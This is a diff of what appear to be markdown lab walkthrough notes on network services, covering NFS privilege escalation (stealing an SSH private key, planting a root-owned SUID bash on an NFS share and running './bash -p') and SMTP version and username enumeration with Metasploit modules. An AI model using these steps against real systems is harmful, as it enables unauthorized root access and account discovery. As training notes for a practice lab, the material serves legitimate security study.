@@ -57,11 +57,29 @@
 2. Search for `.ssh/id_rsa` copy that to your system and login using user\
 Extra : **Download NFS files using scp** : `scp -i id_rsa username@<target ip>:/bin/bash ~/Downloads/bash`
 3. **Download manually** : [bash](https://raw.githubusercontent.com/polo-sec/writing/refs/heads/master/Security%20Challenge%20Walkthroughs/Networks%202/bash)
-4. On another tab go to /tmp/mount/cappucino on attacker machine and copy the bash shell downloaded previous line [bash](https://raw.githubusercontent.com/polo-sec/writing/refs/heads/master/Security%20Challenge%20Walkthroughs/Networks%202/bash)
+4. On another tab go to **/tmp/mount/cappucino** on attacker machine and copy the bash shell downloaded previous line [bash](https://raw.githubusercontent.com/polo-sec/writing/refs/heads/master/Security%20Challenge%20Walkthroughs/Networks%202/bash)
 5. change the bash file ownership to root using : `sudo chown root bash`
 6. Give the bash shell special and executable privilege with : `sudo chmod +xs bash`
 7. Login to ssh with the user and check for the bash file you've put just now and execute using : `./bash -p`
 8. Bam !! You got the root shell 😅 ?
 </details>
 
+## SMTP Enumeration
+**1. As always find out the port SMPT running on using (default port 25)** : `nmap -sV -p- <target ip>` or `nmap -A -p- <target ip>`\
+  **Important for next step: Install metasploit-framework for using available modules for enumeration and exploitation**\
+  **`sudo apt install metasploit-framework` or refer to this [Metasploit-Framework](https://github.com/rapid7/metasploit-framework?tab=readme-ov-file)**\
+**2. Start Metasploit-Framework using** : `msfconsole`\
+**3. Search for module with** : `search smpt_version`\
+**4. Select the module by typing** : `use 0` **0 is the index number** or `use auxiliary/scanner/smtp/smtp_version`\
+**5. Use** : `info` **or** `options` **to see required options needed to be set**\
+**6. Use (in this case only needed to be rhosts becasuse port was same as 25, change if needed) :** `set rhost <target ip>`\
+**7. Run the exploit using :** `run` or `exploit`\
+Got the info !! 😸
 
+<h3>Let's Try other modules for more info</h3>
+
+**1. Search another module** : `search smtp_enum` and select it using `use 0` or `use auxiliary/scanner/smtp/smtp_enum`\
+**2. Set required options** : `set rhosts <target ip>` & `set user_file /path/top-usernames-shortlist.txt`\
+  **Download the username file from here**: [usernames/seclists](https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Usernames/top-usernames-shortlist.txt)\
+**3. Run the exploit:** `run` or `exploit`\
+**Yay !! Got the username [administrator]()**
